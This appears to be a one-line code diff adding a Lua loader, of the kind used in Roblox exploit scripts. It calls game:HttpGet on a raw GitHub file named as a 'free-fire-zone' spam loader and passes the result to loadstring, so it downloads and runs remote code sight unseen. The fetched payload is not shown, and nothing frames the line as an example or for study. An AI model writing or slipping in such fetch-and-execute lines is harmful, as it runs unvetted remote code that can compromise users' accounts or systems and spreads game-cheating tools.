@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/free-fire-zone-max-spam7-h2wc00vqobxssv.lua"))()
